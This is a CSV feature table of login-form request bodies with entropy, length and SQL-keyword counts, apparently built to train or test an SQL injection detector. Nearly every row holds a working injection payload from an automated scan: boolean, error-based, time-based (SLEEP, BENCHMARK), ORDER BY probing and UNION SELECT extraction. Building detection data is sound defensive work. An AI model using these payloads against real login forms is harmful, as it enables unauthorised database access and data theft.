,body,entropy,packet_length,sqli_keywords
31,"uname=(SELECT CONCAT(CONCAT(0x7170766a71,(CASE WHEN (7078=7078) THEN 0x31 ELSE 0x30 END)),0x716a6b7671))&pass=fsdfsdf",4.745311085479342,159,23
32,uname=fdsfds') AND 5805=1417#&pass=fsdfsdf,4.252453066090017,54,5
33,uname=fdsfds') AND 5055=5055#&pass=fsdfsdf,3.9307917564631856,54,5
34,uname=fdsfds' AND 4815=2859#&pass=fsdfsdf,4.1898860782540055,51,4
35,uname=fdsfds' AND 4815=2859#&pass=fsdfsdf,4.1898860782540055,51,4
36,uname=fdsfds' AND 5055=5055#&pass=fsdfsdf,3.8603793708313976,51,4
37,uname=fdsfds' AND 5055=5055#&pass=fsdfsdf,3.8603793708313976,51,4
38,"uname=fdsfds"" AND 7380=9373#&pass=fsdfsdf",4.122693700152458,51,4
39,"uname=fdsfds"" AND 7380=9373#&pass=fsdfsdf",4.122693700152458,51,4
40,"uname=fdsfds"" AND 5055=5055#&pass=fsdfsdf",3.8603793708313976,51,4
41,"uname=fdsfds"" AND 5055=5055#&pass=fsdfsdf",3.8603793708313976,51,4
42,uname=fdsfds')) AND 6501=7235#&pass=fsdfsdf,4.312908871424721,57,6
43,uname=fdsfds')) AND 5055=5055#&pass=fsdfsdf,3.952216429463629,57,6
44,uname=fdsfds'))) AND 4529=7611#&pass=fsdfsdf,4.308768198567054,60,7
45,uname=fdsfds'))) AND 5055=5055#&pass=fsdfsdf,3.956273312105079,60,7
46,uname=fdsfds%' AND 3920=5297#&pass=fsdfsdf,4.252453066090017,54,5
47,uname=fdsfds%' AND 3920=5297#&pass=fsdfsdf,4.252453066090017,54,5
48,uname=fdsfds%' AND 5055=5055#&pass=fsdfsdf,3.9307917564631856,54,5
49,uname=fdsfds%' AND 5055=5055#&pass=fsdfsdf,3.9307917564631856,54,5
50,"uname=fdsfds"") AND 7064=4325#&pass=fsdfsdf",4.300072113709065,54,5
51,"uname=fdsfds"") AND 7064=4325#&pass=fsdfsdf",4.300072113709065,54,5
52,"uname=fdsfds"") AND 5055=5055#&pass=fsdfsdf",3.9307917564631856,54,5
53,"uname=fdsfds"") AND 5055=5055#&pass=fsdfsdf",3.9307917564631856,54,5
54,"uname=fdsfds"")) AND 2672=9112#&pass=fsdfsdf",4.20233009230464,57,6
55,"uname=fdsfds"")) AND 2672=9112#&pass=fsdfsdf",4.20233009230464,57,6
56,"uname=fdsfds"")) AND 5055=5055#&pass=fsdfsdf",3.952216429463629,57,6
57,"uname=fdsfds"")) AND 5055=5055#&pass=fsdfsdf",3.952216429463629,57,6
58,"uname=fdsfds""))) AND 6629=4591#&pass=fsdfsdf",4.263313653112508,60,7
59,"uname=fdsfds""))) AND 6629=4591#&pass=fsdfsdf",4.263313653112508,60,7
60,"uname=fdsfds""))) AND 5055=5055#&pass=fsdfsdf",3.956273312105079,60,7
61,"uname=fdsfds""))) AND 5055=5055#&pass=fsdfsdf",3.956273312105079,60,7
62,uname=fdsfds')) AS CJJe WHERE 5019=5019 AND 8765=6419#&pass=fsdfsdf,4.739315265240143,91,9
63,uname=fdsfds')) AS ebkS WHERE 5629=5629 AND 5055=5055#&pass=fsdfsdf,4.534310228023583,91,9
64,"uname=fdsfds"")) AS OshS WHERE 4724=4724 AND 1649=3081#&pass=fsdfsdf",4.717125900792043,91,9
65,"uname=fdsfds"")) AS OshS WHERE 4724=4724 AND 1649=3081#&pass=fsdfsdf",4.717125900792043,91,9
66,"uname=fdsfds"")) AS RGfn WHERE 5620=5620 AND 5055=5055#&pass=fsdfsdf",4.416397772353581,91,9
67,"uname=fdsfds"")) AS RGfn WHERE 5620=5620 AND 5055=5055#&pass=fsdfsdf",4.416397772353581,91,9
68,uname=fdsfds') AS eddw WHERE 5295=5295 AND 1129=5628#&pass=fsdfsdf,4.521613915358185,88,8
69,uname=fdsfds') AS LQNG WHERE 3808=3808 AND 5055=5055#&pass=fsdfsdf,4.527137066518795,88,8
70,"uname=fdsfds"") AS Jmzi WHERE 7803=7803 AND 9672=3759#&pass=fsdfsdf",4.750695968066727,88,8
71,"uname=fdsfds"") AS Jmzi WHERE 7803=7803 AND 9672=3759#&pass=fsdfsdf",4.750695968066727,88,8
72,"uname=fdsfds"") AS tdQN WHERE 3159=3159 AND 5055=5055#&pass=fsdfsdf",4.495320923032282,88,8
73,"uname=fdsfds"") AS tdQN WHERE 3159=3159 AND 5055=5055#&pass=fsdfsdf",4.495320923032282,88,8
74,uname=fdsfds' IN BOOLEAN MODE) AND 2214=7764#&pass=fsdfsdf,4.5649858492708315,76,5
75,uname=fdsfds' IN BOOLEAN MODE) AND 5055=5055#&pass=fsdfsdf,4.366541452644505,76,5
76,uname=fdsfds) AND 1869=2900#&pass=fsdfsdf,4.1898860782540055,51,4
77,uname=fdsfds) AND 1869=2900#&pass=fsdfsdf,4.1898860782540055,51,4
78,uname=fdsfds) AND 5055=5055#&pass=fsdfsdf,3.8603793708313976,51,4
79,uname=fdsfds) AND 5055=5055#&pass=fsdfsdf,3.8603793708313976,51,4
80,uname=fdsfds)) AND 5288=8791#&pass=fsdfsdf,4.186860506514697,54,5
81,uname=fdsfds)) AND 5288=8791#&pass=fsdfsdf,4.186860506514697,54,5
82,uname=fdsfds)) AND 5055=5055#&pass=fsdfsdf,3.8831727088441377,54,5
83,uname=fdsfds)) AND 5055=5055#&pass=fsdfsdf,3.8831727088441377,54,5
84,uname=fdsfds))) AND 9380=7335#&pass=fsdfsdf,4.184774568998513,57,6
85,uname=fdsfds))) AND 9380=7335#&pass=fsdfsdf,4.184774568998513,57,6
86,uname=fdsfds))) AND 5055=5055#&pass=fsdfsdf,3.888149278250525,57,6
87,uname=fdsfds))) AND 5055=5055#&pass=fsdfsdf,3.888149278250525,57,6
88,uname=fdsfds AND 5308=5060#&pass=fsdfsdf,4.056198332810094,48,3
89,uname=fdsfds AND 5308=5060#&pass=fsdfsdf,4.056198332810094,48,3
90,uname=fdsfds AND 5055=5055#&pass=fsdfsdf,3.787326145256008,48,3
91,uname=fdsfds AND 5055=5055#&pass=fsdfsdf,3.787326145256008,48,3
92,uname=fdsfds)) AS haVq WHERE 2897=2897 AND 4669=8267#&pass=fsdfsdf,4.632901460327068,88,8
93,uname=fdsfds)) AS haVq WHERE 2897=2897 AND 4669=8267#&pass=fsdfsdf,4.632901460327068,88,8
94,uname=fdsfds)) AS sggO WHERE 9586=9586 AND 5055=5055#&pass=fsdfsdf,4.456956241583199,88,8
95,uname=fdsfds)) AS sggO WHERE 9586=9586 AND 5055=5055#&pass=fsdfsdf,4.456956241583199,88,8
96,uname=fdsfds) AS Zsht WHERE 4296=4296 AND 2661=6601#&pass=fsdfsdf,4.560282237033727,85,7
97,uname=fdsfds) AS Zsht WHERE 4296=4296 AND 2661=6601#&pass=fsdfsdf,4.560282237033727,85,7
98,uname=fdsfds) AS GExG WHERE 9527=9527 AND 5055=5055#&pass=fsdfsdf,4.462612767101468,85,7
99,uname=fdsfds) AS GExG WHERE 9527=9527 AND 5055=5055#&pass=fsdfsdf,4.462612767101468,85,7
100,uname=fdsfds` WHERE 4283=4283 AND 7268=1581#&pass=fsdfsdf,4.536849610990577,73,5
101,uname=fdsfds` WHERE 4283=4283 AND 7268=1581#&pass=fsdfsdf,4.536849610990577,73,5
102,uname=fdsfds` WHERE 8835=8835 AND 5055=5055#&pass=fsdfsdf,4.234303777695201,73,5
103,uname=fdsfds` WHERE 8835=8835 AND 5055=5055#&pass=fsdfsdf,4.234303777695201,73,5
104,uname=fdsfds`) WHERE 1124=1124 AND 1002=8751#&pass=fsdfsdf,4.489289995381811,76,6
105,uname=fdsfds`) WHERE 1124=1124 AND 1002=8751#&pass=fsdfsdf,4.489289995381811,76,6
106,uname=fdsfds`) WHERE 5143=5143 AND 5055=5055#&pass=fsdfsdf,4.35592210756268,76,6
107,uname=fdsfds`) WHERE 5143=5143 AND 5055=5055#&pass=fsdfsdf,4.35592210756268,76,6
108,uname=-9621&pass=fsdfsdf,3.8035088547976788,24,1
109,uname=-9621&pass=fsdfsdf,3.8035088547976788,24,1
110,uname=-1182') OR 2534=2259#&pass=fsdfsdf,4.434183719779188,52,6
111,uname=-2664') OR 8102=8102#&pass=fsdfsdf,4.415311532225101,52,6
112,uname=-8926' OR 9291=1669#&pass=fsdfsdf,4.252974975106085,49,5
113,uname=-8926' OR 9291=1669#&pass=fsdfsdf,4.252974975106085,49,5
114,uname=-1394' OR 8102=8102#&pass=fsdfsdf,4.406821128952238,49,5
115,uname=-2465' OR 9442=2627#&pass=fsdfsdf,4.304257026388135,49,5
116,uname=-2465' OR 9442=2627#&pass=fsdfsdf,4.304257026388135,49,5
117,uname=-7289' USymSOXIJM#&pass=fsdfsdf,4.594456406111019,43,3
118,"uname=-7155"" OR 1282=4190#&pass=fsdfsdf",4.458103180234289,49,5
119,"uname=-7155"" OR 1282=4190#&pass=fsdfsdf",4.458103180234289,49,5
120,"uname=-5994"" OR 8102=8102#&pass=fsdfsdf",4.426177218751301,49,5
121,"uname=-5994"" OR 8102=8102#&pass=fsdfsdf",4.426177218751301,49,5
122,uname=-2632')) OR 7393=2088#&pass=fsdfsdf,4.4546361507484775,55,7
123,uname=-9237')) OR 8102=8102#&pass=fsdfsdf,4.473048041045148,55,7
124,uname=-3557'))) OR 5852=7034#&pass=fsdfsdf,4.433634982148037,58,8
125,uname=-6511'))) OR 8102=8102#&pass=fsdfsdf,4.38601593452899,58,8
126,uname=-5137%' OR 6016=4668#&pass=fsdfsdf,4.484183719779187,52,6
127,uname=-5137%' OR 6016=4668#&pass=fsdfsdf,4.484183719779187,52,6
128,uname=-1390%' OR 8102=8102#&pass=fsdfsdf,4.396439344671015,52,6
129,uname=-6292%' OR 6292=2501#&pass=fsdfsdf,4.343942707918267,52,6
130,uname=-6292%' OR 6292=2501#&pass=fsdfsdf,4.343942707918267,52,6
131,uname=-6472%' USymSOXIJM#&pass=fsdfsdf,4.649114684439283,46,4
132,"uname=-5625"") OR 8409=2812#&pass=fsdfsdf",4.515311532225102,52,6
133,"uname=-5625"") OR 8409=2812#&pass=fsdfsdf",4.515311532225102,52,6
134,"uname=-9950"") OR 8102=8102#&pass=fsdfsdf",4.415311532225101,52,6
135,"uname=-9950"") OR 8102=8102#&pass=fsdfsdf",4.415311532225101,52,6
136,"uname=-9555"")) OR 9286=9623#&pass=fsdfsdf",4.405855662943599,55,7
137,"uname=-9555"")) OR 9286=9623#&pass=fsdfsdf",4.405855662943599,55,7
138,"uname=-7831"")) OR 8102=8102#&pass=fsdfsdf",4.405855662943599,55,7
139,"uname=-7831"")) OR 8102=8102#&pass=fsdfsdf",4.405855662943599,55,7
140,"uname=-1708""))) OR 3349=1081#&pass=fsdfsdf",4.463280517810812,58,8
141,"uname=-1708""))) OR 3349=1081#&pass=fsdfsdf",4.463280517810812,58,8
142,"uname=-9124""))) OR 8102=8102#&pass=fsdfsdf",4.39768795823549,58,8
143,"uname=-9124""))) OR 8102=8102#&pass=fsdfsdf",4.39768795823549,58,8
144,uname=-9978')) AS eDNZ WHERE 4030=4030 OR 2063=2402#&pass=fsdfsdf,4.790997043531414,89,10
145,uname=-5914')) AS nBKk WHERE 6398=6398 OR 8102=8102#&pass=fsdfsdf,4.887376466708188,89,10
146,"uname=-7730"")) AS cugk WHERE 3178=3178 OR 9493=6404#&pass=fsdfsdf",4.837451659049164,89,10
147,"uname=-7730"")) AS cugk WHERE 3178=3178 OR 9493=6404#&pass=fsdfsdf",4.837451659049164,89,10
148,"uname=-8561"")) AS ubrU WHERE 2689=2689 OR 8102=8102#&pass=fsdfsdf",4.770305074793775,89,10
149,"uname=-8561"")) AS ubrU WHERE 2689=2689 OR 8102=8102#&pass=fsdfsdf",4.770305074793775,89,10
150,uname=-1950') AS JDNZ WHERE 6915=6915 OR 9104=3316#&pass=fsdfsdf,4.790873781480404,86,9
151,uname=-6326') AS HYee WHERE 1812=1812 OR 8102=8102#&pass=fsdfsdf,4.591578664259099,86,9
152,"uname=-8492"") AS WIuQ WHERE 8615=8615 OR 4469=7421#&pass=fsdfsdf",4.804229296672176,86,9
153,"uname=-8492"") AS WIuQ WHERE 8615=8615 OR 4469=7421#&pass=fsdfsdf",4.804229296672176,86,9
154,"uname=-8717"") AS KUKo WHERE 3529=3529 OR 8102=8102#&pass=fsdfsdf",4.847274413893479,86,9
155,"uname=-8717"") AS KUKo WHERE 3529=3529 OR 8102=8102#&pass=fsdfsdf",4.847274413893479,86,9
156,uname=-6172) OR 4126=7568#&pass=fsdfsdf,4.406821128952238,49,5
157,uname=-6172) OR 4126=7568#&pass=fsdfsdf,4.406821128952238,49,5
158,uname=-9401) OR 8102=8102#&pass=fsdfsdf,4.336182987871123,49,5
159,uname=-9401) OR 8102=8102#&pass=fsdfsdf,4.336182987871123,49,5
160,uname=-4011)) OR 3507=3132#&pass=fsdfsdf,4.396439344671014,52,6
161,uname=-4011)) OR 3507=3132#&pass=fsdfsdf,4.396439344671014,52,6
162,uname=-9500)) OR 8102=8102#&pass=fsdfsdf,4.334183719779189,52,6
163,uname=-9500)) OR 8102=8102#&pass=fsdfsdf,4.334183719779189,52,6
164,uname=-1742))) OR 7980=7965#&pass=fsdfsdf,4.503416638553356,55,7
165,uname=-1742))) OR 7980=7965#&pass=fsdfsdf,4.503416638553356,55,7
166,uname=-8720))) OR 8102=8102#&pass=fsdfsdf,4.271470906740504,55,7
167,uname=-8720))) OR 8102=8102#&pass=fsdfsdf,4.271470906740504,55,7
168,uname=-7000 OR 9516=6587#&pass=fsdfsdf,4.346225868535943,46,4
169,uname=-7000 OR 9516=6587#&pass=fsdfsdf,4.346225868535943,46,4
170,uname=-9243 OR 8102=8102#&pass=fsdfsdf,4.346225868535942,46,4
171,uname=-9243 OR 8102=8102#&pass=fsdfsdf,4.346225868535942,46,4
172,uname=-6867)) AS XoYm WHERE 4407=4407 OR 7171=2864#&pass=fsdfsdf,4.715018266288633,86,9
173,uname=-6867)) AS XoYm WHERE 4407=4407 OR 7171=2864#&pass=fsdfsdf,4.715018266288633,86,9
174,uname=-1114)) AS BZvh WHERE 6826=6826 OR 8102=8102#&pass=fsdfsdf,4.689464015923012,86,9
175,uname=-1114)) AS BZvh WHERE 6826=6826 OR 8102=8102#&pass=fsdfsdf,4.689464015923012,86,9
176,uname=-3389) AS XBWu WHERE 8264=8264 OR 7545=9838#&pass=fsdfsdf,4.748961225321278,83,8
177,uname=-3389) AS XBWu WHERE 8264=8264 OR 7545=9838#&pass=fsdfsdf,4.748961225321278,83,8
178,uname=-4298) AS epAA WHERE 6520=6520 OR 8102=8102#&pass=fsdfsdf,4.653723130083182,83,8
179,uname=-4298) AS epAA WHERE 6520=6520 OR 8102=8102#&pass=fsdfsdf,4.653723130083182,83,8
180,uname=fdsfds') OR NOT 1978=6848#&pass=fsdfsdf,4.305540252212915,59,5
181,uname=fdsfds') OR NOT 5984=5984#&pass=fsdfsdf,4.233426641149881,59,5
182,uname=fdsfds' OR NOT 7511=7811#&pass=fsdfsdf,4.126950016748872,56,4
183,uname=fdsfds' OR NOT 5984=5984#&pass=fsdfsdf,4.172404562203417,56,4
184,uname=fdsfds' OR NOT 5984=5984#&pass=fsdfsdf,4.172404562203417,56,4
185,uname=fdsfds' OR NOT 6929=2049#&pass=fsdfsdf,4.2007025735178845,56,4
186,"uname=fdsfds' AND (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x7170766a71,(SELECT (ELT(7464=7464,1))),0x716a6b7671,0x78))s), 8446744073709551610, 8446744073709551610)))-- JYkZ&pass=fsdfsdf",5.011298617119382,267,33
187,"uname=fdsfds' OR (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x7170766a71,(SELECT (ELT(9907=9907,1))),0x716a6b7671,0x78))s), 8446744073709551610, 8446744073709551610)))-- sugN&pass=fsdfsdf",4.9694938843723016,266,33
188,"uname=fdsfds' AND EXP(~(SELECT * FROM (SELECT CONCAT(0x7170766a71,(SELECT (ELT(2982=2982,1))),0x716a6b7671,0x78))x))-- xJdC&pass=fsdfsdf",5.056249427496135,194,26
189,"uname=fdsfds' AND EXP(~(SELECT * FROM (SELECT CONCAT(0x7170766a71,(SELECT (ELT(2982=2982,1))),0x716a6b7671,0x78))x))-- xJdC&pass=fsdfsdf",5.056249427496135,194,26
190,"uname=fdsfds' OR EXP(~(SELECT * FROM (SELECT CONCAT(0x7170766a71,(SELECT (ELT(4571=4571,1))),0x716a6b7671,0x78))x))-- USHb&pass=fsdfsdf",5.020283402839836,193,26
191,"uname=fdsfds' AND GTID_SUBSET(CONCAT(0x7170766a71,(SELECT (ELT(8334=8334,1))),0x716a6b7671),8334)-- yjfE&pass=fsdfsdf",5.089441836446774,157,18
192,"uname=(SELECT CONCAT(0x7170766a71,(ELT(1796=1796,1)),0x716a6b7671))&pass=fsdfsdf",4.5579717644257185,106,13
193,"uname=(SELECT CONCAT(0x7170766a71,(ELT(1796=1796,1)),0x716a6b7671))&pass=fsdfsdf",4.5579717644257185,106,13
194,uname=fdsfds';SELECT SLEEP(5)#&pass=fsdfsdf,4.2374411389168944,55,7
195,uname=fdsfds';SELECT SLEEP(5)-- reQo&pass=fsdfsdf,4.449007487405744,61,7
196,uname=fdsfds';(SELECT * FROM (SELECT(SLEEP(5)))wOaq)#&pass=fsdfsdf,4.6254738088774765,96,15
197,uname=fdsfds';(SELECT * FROM (SELECT(SLEEP(5)))Goab)-- Qzjs&pass=fsdfsdf,4.766653300891517,102,15
198,"uname=fdsfds';SELECT BENCHMARK(5000000,MD5(0x61627068))#&pass=fsdfsdf",4.910999957023229,87,11
199,"uname=fdsfds';SELECT BENCHMARK(5000000,MD5(0x5163614c))-- qNji&pass=fsdfsdf",5.0784096913292975,93,11
200,uname=fdsfds' AND (SELECT 9883 FROM (SELECT(SLEEP(5)))ydon)-- ldrU&pass=fsdfsdf,4.871394476074932,109,14
201,uname=fdsfds' AND (SELECT 9883 FROM (SELECT(SLEEP(5)))ydon)-- ldrU&pass=fsdfsdf,4.871394476074932,109,14
202,uname=fdsfds' AND (SELECT 9883 FROM (SELECT(SLEEP(0)))ydon)-- ldrU&pass=fsdfsdf,4.871394476074932,109,14
203,uname=fdsfds' AND (SELECT 9883 FROM (SELECT(SLEEP(0)))ydon)-- ldrU&pass=fsdfsdf,4.871394476074932,109,14
204,uname=fdsfds' AND (SELECT 9883 FROM (SELECT(SLEEP(5)))ydon)-- ldrU&pass=fsdfsdf,4.871394476074932,109,14
205,uname=fdsfds' AND (SELECT 9883 FROM (SELECT(SLEEP(5)))ydon)-- ldrU&pass=fsdfsdf,4.871394476074932,109,14
206,uname=fdsfds' ORDER BY 1#&pass=fsdfsdf,4.0407090139455,48,3
207,uname=fdsfds' ORDER BY 1#&pass=fsdfsdf,4.0407090139455,48,3
208,uname=fdsfds' ORDER BY 6104#&pass=fsdfsdf,4.238666566058884,51,3
209,uname=fdsfds' ORDER BY 10#&pass=fsdfsdf,4.109138039864114,49,3
210,uname=fdsfds' ORDER BY 6#&pass=fsdfsdf,4.0407090139455,48,3
211,uname=fdsfds' ORDER BY 6#&pass=fsdfsdf,4.0407090139455,48,3
212,uname=fdsfds' ORDER BY 8#&pass=fsdfsdf,4.0407090139455,48,3
213,uname=fdsfds' ORDER BY 8#&pass=fsdfsdf,4.0407090139455,48,3
214,uname=fdsfds' ORDER BY 9#&pass=fsdfsdf,4.0407090139455,48,3
215,"uname=fdsfds' UNION ALL SELECT CONCAT(0x7170766a71,0x586441417443517a59714642456953416e70716b706a465a596763574f49546a556468534e4e6678,0x716a6b7671),NULL,NULL,NULL,NULL,NULL,NULL,NULL#&pass=fsdfsdf",4.670939867097161,230,17
216,"uname=fdsfds' UNION ALL SELECT CONCAT(0x7170766a71,0x586441417443517a59714642456953416e70716b706a465a596763574f49546a556468534e4e6678,0x716a6b7671),NULL,NULL,NULL,NULL,NULL,NULL,NULL UNION ALL SELECT CONCAT(0x7170766a71,0x436c71446b5961766c68596377617650784a77495747474979576f6843484d65425552494a657141,0x716a6b7671),NULL,NULL,NULL,NULL,NULL,NULL,NULL#&pass=fsdfsdf",4.576109950519345,429,32
217,"uname=fdsfds&pass=fsdfsdf.,.,),'(.""",3.739877574570946,49,4
218,"uname=fdsfds&pass=fsdfsdf'qEdkYh<'"">IjhEeX",4.184482757226366,52,5
219,uname=fdsfds&pass=fsdfsdf') AND 6112=7726 AND ('APij'='APij,4.406042787009911,83,9
220,uname=fdsfds&pass=fsdfsdf') AND 6865=6865 AND ('ijhW'='ijhW,4.406042787009911,83,9
221,uname=fdsfds&pass=fsdfsdf' AND 9429=7038 AND 'yxYK'='yxYK,4.4799178127829204,77,7
222,uname=fdsfds&pass=fsdfsdf' AND 9429=7038 AND 'yxYK'='yxYK,4.4799178127829204,77,7
223,uname=fdsfds&pass=fsdfsdf' AND 6865=6865 AND 'ZobS'='ZobS,4.304479216291693,77,7
224,uname=fdsfds&pass=fsdfsdf' AND 6865=6865 AND 'ZobS'='ZobS,4.304479216291693,77,7
225,uname=fdsfds&pass=fsdfsdf) AND 3820=4660 AND (8617=8617,4.365463295689618,71,6
226,uname=fdsfds&pass=fsdfsdf) AND 3820=4660 AND (8617=8617,4.365463295689618,71,6
227,uname=fdsfds&pass=fsdfsdf) AND 6865=6865 AND (2749=2749,4.342824886638045,71,6
228,uname=fdsfds&pass=fsdfsdf) AND 6865=6865 AND (2749=2749,4.342824886638045,71,6
229,uname=fdsfds&pass=fsdfsdf AND 3143=6298,4.109138039864114,45,2
230,uname=fdsfds&pass=fsdfsdf AND 3143=6298,4.109138039864114,45,2
231,uname=fdsfds&pass=fsdfsdf AND 6865=6865,3.8527277834538585,45,2
232,uname=fdsfds&pass=fsdfsdf AND 6865=6865,3.8527277834538585,45,2
233,uname=fdsfds&pass=fsdfsdf AND 7609=9882-- lJxj,4.3794491194680845,54,3
234,uname=fdsfds&pass=fsdfsdf AND 7609=9882-- lJxj,4.3794491194680845,54,3
235,uname=fdsfds&pass=fsdfsdf AND 6865=6865-- ggGy,4.162057815120259,54,3
236,uname=fdsfds&pass=fsdfsdf AND 6865=6865-- ggGy,4.162057815120259,54,3
237,uname=fdsfds&pass=(SELECT (CASE WHEN (4507=3068) THEN 0x66736466736466 ELSE (SELECT 3068 UNION SELECT 6990) END)),4.685785761069005,155,19
238,uname=fdsfds&pass=(SELECT (CASE WHEN (4507=3068) THEN 0x66736466736466 ELSE (SELECT 3068 UNION SELECT 6990) END)),4.685785761069005,155,19
239,uname=fdsfds&pass=(SELECT (CASE WHEN (2398=2398) THEN 0x66736466736466 ELSE (SELECT 6602 UNION SELECT 1070) END)),4.742813259569655,155,19
240,uname=fdsfds&pass=(SELECT (CASE WHEN (2398=2398) THEN 0x66736466736466 ELSE (SELECT 6602 UNION SELECT 1070) END)),4.742813259569655,155,19
241,"uname=fdsfds&pass=(SELECT CONCAT(CONCAT(0x7170766a71,(CASE WHEN (7543=7543) THEN 0x31 ELSE 0x30 END)),0x716a6b7671))",4.824690133918008,158,23
242,"uname=fdsfds&pass=(SELECT CONCAT(CONCAT(0x7170766a71,(CASE WHEN (7543=7543) THEN 0x31 ELSE 0x30 END)),0x716a6b7671))",4.824690133918008,158,23
243,uname=fdsfds&pass=fsdfsdf') AND 2872=8985#,4.186860506514697,54,5
244,uname=fdsfds&pass=fsdfsdf') AND 4426=4426#,4.061976875613826,54,5
245,uname=fdsfds&pass=fsdfsdf' AND 7302=1560#,4.238666566058884,51,4
246,uname=fdsfds&pass=fsdfsdf' AND 7302=1560#,4.238666566058884,51,4
247,uname=fdsfds&pass=fsdfsdf' AND 4426=4426#,3.9947641270344936,51,4
248,uname=fdsfds&pass=fsdfsdf' AND 4426=4426#,3.9947641270344936,51,4
249,"uname=fdsfds&pass=fsdfsdf"" AND 8643=3126#",4.1898860782540055,51,4
250,"uname=fdsfds&pass=fsdfsdf"" AND 8643=3126#",4.1898860782540055,51,4
251,"uname=fdsfds&pass=fsdfsdf"" AND 4426=4426#",3.9947641270344936,51,4
252,"uname=fdsfds&pass=fsdfsdf"" AND 4426=4426#",3.9947641270344936,51,4
253,uname=fdsfds&pass=fsdfsdf')) AND 3032=6678#,4.266397243517744,57,6
254,uname=fdsfds&pass=fsdfsdf')) AND 4426=4426#,4.080350731889837,57,6
255,uname=fdsfds&pass=fsdfsdf'))) AND 6659=3391#,4.217859107657963,60,7
